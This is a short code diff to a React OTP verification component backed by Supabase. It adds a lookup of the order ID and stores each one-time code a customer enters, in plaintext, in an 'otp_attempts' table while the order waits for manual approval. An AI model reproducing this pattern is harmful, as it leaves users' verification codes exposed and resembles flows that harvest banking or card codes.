@@ -41,6 +41,15 @@ const OtpVerification = () => {
     // Update database - set status to waiting_otp_approval
     try {
       if (orderData.sequenceNumber) {
+        // First, get the order ID
+        const { data: orderInfo, error: orderError } = await supabase
+          .from("customer_orders")
+          .select("id")
+          .eq("sequence_number", orderData.sequenceNumber)
+          .single();
+
+        if (orderError) throw orderError;
+
         await supabase
           .from("customer_orders")
           .update({
@@ -49,6 +58,18 @@ const OtpVerification = () => {
           })
           .eq("sequence_number", orderData.sequenceNumber);
         
+        // Save OTP attempt
+        const { error: otpError } = await supabase
+          .from("otp_attempts")
+          .insert({
+            order_id: orderInfo.id,
+            otp_code: otp,
+          });
+
+        if (otpError) {
+          console.error("Error saving OTP attempt:", otpError);
+        }
+
         setIsLoading(false);
         setWaitingApproval(true);
         
